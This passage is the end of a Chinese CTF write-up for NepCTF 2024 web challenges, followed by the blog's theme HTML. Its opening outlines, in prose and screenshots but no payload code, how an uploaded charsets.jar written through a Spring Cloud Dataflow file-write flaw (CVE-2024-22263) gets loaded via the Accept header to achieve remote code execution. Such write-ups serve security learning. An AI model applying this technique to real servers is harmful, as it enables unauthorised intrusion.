+<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks">https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks</a></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829212409931.png" srcset="/img/loading.gif" lazyload alt="image-20240829212409931"></p>
+<p>把charsets.jar打包成zip</p>
+<p>同样用脚本转换得到 <code>packageFileAsBytes</code></p>
+<p>上传功能详细请看文章<a target="_blank" rel="noopener" href="https://blog.securelayer7.net/spring-cloud-data-flow-exploit/">CVE-2024-22263: Spring Cloud Dataflow Arbitrary File Writing - SecureLayer7 - Offensive Security, API Scanner &amp; Attack Surface Management</a></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829210304571.png" srcset="/img/loading.gif" lazyload alt="image-20240829210304571"></p>
+<p>会在lib同目录下生成<code>lib-version.zip</code></p>
+<p><img src="/../images/NepCTF2024-web/image-20240829205503420.png" srcset="/img/loading.gif" lazyload alt="image-20240829205503420"></p>
+<p>然后会解压zip文件到lib目录下</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829205349557.png" srcset="/img/loading.gif" lazyload alt="image-20240829205349557"></p>
+<p>然后Accept请求头中指定<code>charset</code>加载<code>charsets.jar</code>，成功进行rce</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829211651941.png" srcset="/img/loading.gif" lazyload alt="image-20240829211651941"></p>
+<p>要注意只能指定一次，因为charsets.jar只会被加载一次</p>
+<p><img src="/../images/NepCTF2024-web/image-20240829212009581.png" srcset="/img/loading.gif" lazyload alt="image-20240829212009581"></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://chenxi9981.github.io/NepCTF_2024/">NepCTF 2024 | 晨曦的个人小站 (chenxi9981.github.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/ph0ebus/writeups/cocyh6qewfx6ftkp#">NepCTF2024 (yuque.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NepCTF2024-web</div>
+      <div>https://zer0peach.github.io/2024/08/28/NepCTF2024-web/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/01/MiniLCTF2024/" title="MiniLCTF2024">
+                        <span class="hidden-mobile">MiniLCTF2024</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
